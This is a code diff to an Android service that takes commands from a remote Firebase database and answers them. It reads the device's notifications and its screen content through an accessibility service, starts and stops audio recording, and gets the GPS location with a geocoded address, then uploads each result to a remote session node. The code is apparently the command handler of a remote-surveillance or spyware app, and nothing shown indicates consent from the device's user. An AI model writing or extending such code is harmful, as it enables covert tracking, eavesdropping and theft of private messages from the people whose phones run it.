@@ -1,20 +1,28 @@
 package com.jonas.x24.services
 
+import android.Manifest
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.location.Geocoder
+import android.location.Location
+import android.location.LocationManager
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
+import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
-import com.jonas.x24.CommandReceiverActivity
+import com.jonas.x24.AudioRecordManager
+import com.jonas.x24.services.x24AccessibilityService
+import com.jonas.x24.services.x24NotificationService
 
 class FirebaseCommandService : Service() {
 
@@ -69,19 +77,99 @@ class FirebaseCommandService : Service() {
 
     private fun processCommand(command: String) {
         Log.d("FirebaseService", "Received command: $command")
+        val currentSessionKey = sessionKey ?: return
 
-        // Ensure CommandReceiverActivity is running to receive the broadcast/intent
-        val activityIntent = Intent(this, CommandReceiverActivity::class.java)
-        activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-        activityIntent.putExtra("COMMAND", command)
-        activityIntent.putExtra("SESSION_KEY", sessionKey)
-        startActivity(activityIntent)
+        when (command) {
+            "READ_NOTIFICATIONS" -> readNotifications()
+            "READ_SCREEN" -> readScreen()
+            "START_RECORD_AUDIO" -> {
+                AudioRecordManager.startRecording(this, currentSessionKey)
+            }
+            "STOP_RECORD_AUDIO" -> {
+                AudioRecordManager.stopRecording(currentSessionKey)
+            }
+            "GET_LOCATION" -> getLocation()
+        }
+    }
 
-        // Broadcast the command so that the receiver activity can process it
-        val intent = Intent("com.jonas.x24.COMMAND_RECEIVED")
-        intent.putExtra("COMMAND", command)
-        intent.putExtra("SESSION_KEY", sessionKey)
-        sendBroadcast(intent)
+    private fun postResult(type: String, data: String) {
+        val currentSessionKey = sessionKey ?: return
+        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
+        val payload = mapOf(
+            "type" to type,
+            "data" to data,
+            "timestamp" to System.currentTimeMillis()
+        )
+        ref.setValue(payload)
+    }
+
+    private fun getLocation() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            postResult("ERROR", "Location permissions denied")
+            return
+        }
+
+        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        var location: Location? = null
+        try {
+            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+            if (location == null) {
+                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            }
+        } catch(e: Exception) {
+            Log.e("FirebaseService", "Location error", e)
+        }
+
+        if (location != null) {
+            val geocoder = Geocoder(this, java.util.Locale.getDefault())
+            try {
+                val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
+                if (!addresses.isNullOrEmpty()) {
+                    val address = addresses[0]
+                    val locStr = "${address.locality ?: "Unknown City"}, ${address.adminArea ?: ""}"
+                    postResult("TEXT", "Location: $locStr\nCoords: ${location.latitude}, ${location.longitude}")
+                    return
+                }
+            } catch (e: Exception) { }
+            postResult("TEXT", "Coords: ${location.latitude}, ${location.longitude}")
+        } else {
+            postResult("ERROR", "Could not determine location")
+        }
+    }
+
+    private fun readScreen() {
+        val service = x24AccessibilityService.instance
+        if (service != null) {
+            val screenContext = service.getScreenContext()
+            postResult("TEXT", "Screen Context:\n$screenContext")
+        } else {
+            postResult("ERROR", "Accessibility service not running")
+        }
+    }
+
+    private fun readNotifications() {
+        val activeNotifs = x24NotificationService.instance?.getActiveNotificationsList() ?: emptyList()
+        val recentNotifs = x24NotificationService.recentNotifications
+
+        val builder = java.lang.StringBuilder()
+
+        if (activeNotifs.isNotEmpty()) {
+            builder.append("Active Notifications:\n")
+            builder.append(activeNotifs.joinToString("\n"))
+            builder.append("\n\n")
+        } else {
+            builder.append("No active notifications.\n\n")
+        }
+
+        if (recentNotifs.isNotEmpty()) {
+            builder.append("Recent Notifications:\n")
+            builder.append(recentNotifs.joinToString("\n"))
+        } else {
+            builder.append("No recent notifications.")
+        }
+
+        postResult("TEXT", builder.toString().trim())
     }
 
     private fun createNotification(): android.app.Notification {
